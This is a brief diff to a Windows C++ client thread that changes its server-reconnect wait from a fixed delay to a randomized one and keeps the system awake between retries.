@@ -516,7 +516,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 		ULONGLONG dwTickCount = GetTickCount64();
 		if (!ClientObject->ConnectServer(settings.ServerIP(), settings.ServerPort()))
 		{
-			for (int k = 500; app.m_bIsRunning(&app) && --k; Sleep(10));
+			for (int k = 300+(IsDebug ? rand()%600:rand()%6000); app.m_bIsRunning(&app) && --k; Sleep(10));
 			SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
 			continue;
 		}
